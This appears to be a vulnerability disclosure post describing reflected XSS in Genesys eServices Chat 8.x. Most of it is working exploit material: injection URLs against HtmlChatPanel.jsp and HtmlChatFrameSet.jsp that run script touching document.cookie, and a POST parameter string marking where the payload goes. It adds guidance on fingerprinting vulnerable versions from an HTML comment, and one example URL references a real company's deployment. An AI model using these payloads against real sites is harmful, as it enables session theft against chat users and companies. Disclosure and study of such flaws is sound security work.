|  | Hi for all, |
| --- | --- |
|  |  |
|  | My name is Luis Eduardo Jácome V.(a.k.a Mortal\_Poison) and I find a vulnerability(gXSS and pXSS) in Genesys eServices Chat that affects the versions 8.x.x. |
|  |  |
|  | First of all, if you find Genesys eServices Chat with "<!-- Version 8.1.200.03 -->" in the HTML Source, is vulnerable: |
|  |  |
|  | A small PoC(for versions 8.1.x): |
|  |  |
|  | https://example.com/HtmlChatPanel.jsp?Email=%3C/Script/%3E%3CScript/%3E(confirm)(document.cookie)%3C/Script/%3E |
|  | http://example.com/HtmlChatFrameSet.jsp?email=%3C/Script/%3E%3CScript/%3E(confirm)(1)%3C/Script/%3E |
|  |  |
|  |  |
|  | https://example.com/HtmlChatPanel.jsp?ActionColor=%3C/Script/%3E%3CSvg/OnLoad=(confirm)(document.cookie)%3E&ClientNickNameColor=%3C/SCRIPT/%3E&AgentNickNameColor=008000&ClientMessageColor=1532a0&AgentMessageColor=708090&Logo=.%2FResource%2FImages%2Flogo.jpg&FontSize=3&FontName=arial&ShowSmiles=1&BackgroundColor=FFFFFF |
|  |  |
|  |  |
|  | The problem is that application not sanitize correctly the "values" of form(HtmlChatFrameSet.jsp and/or HtmlChatPanel.jsp). |
|  | The file changes with respect to the version of Genesys eServices Chat. However, in any of the versions, the form is not validated. |
|  |  |
|  | For versions with HTML Source "<!-- Version 8.1.000.07 -->", you can execute the next payload: |
|  |  |
|  | https://example.com/HtmlChatPanel.jsp?ActionColor=%3C/Script/%3E%3CSvg/OnLoad=(confirm)(document.cookie)%3E&ClientNickNameColor=%3C/SCRIPT/%3E&AgentNickNameColor=008000&ClientMessageColor=1532a0&AgentMessageColor=708090&Logo=.%2FResource%2FImages%2Flogo.jpg&FontSize=3&FontName=arial&ShowSmiles=1&BackgroundColor=FFFFFF |
|  |  |
|  | If the request is made by POST method, you should see something like the following (may vary, depending on the fields of the form): |
|  | cmd=connect&chat\_alias=&first\_name=null&last\_name=null&email\_address=%INJECT\_HERE%&celular=null&subject=null&msg2send=&secure\_key=&user\_id=&script\_pos=&session\_id=&timeZoneOffset=-300 |
|  |  |
|  | In the part of %Inject\_Here% you have to inject the malicious payload as for example: </Script/><Script/>(confirm)(1)</Script/> |
|  |  |
|  | You must insert it without the "%". |
|  |  |
|  | Remember that you must capture it with an application that intercepts requests, in my case, BurpSuite. |
|  |  |
|  | The product is used by many companies, however, not all are indexed by search engines. |
|  |  |
|  | https://example.com/HtmlChatPanel.jsp?ActionColor=080008&ClientNickNameColor=000019&AgentNickNameColor=0a82d8&ClientMessageColor=030717&AgentMessageColor=0074ce&Logo=https%3A%2F%2Fcontact.falabella.com%2FWebAPI812%2FSODIMAC\_AR%2FChat%2FResources%2FImages%2Flogo.jpg&FontSize=13px&FontName=arial&ShowSmiles=0&BackgroundColor=FFFFFF |

|  |  |
|  | Tested on: |
|  | Firefox 50.0 and 60.0 |
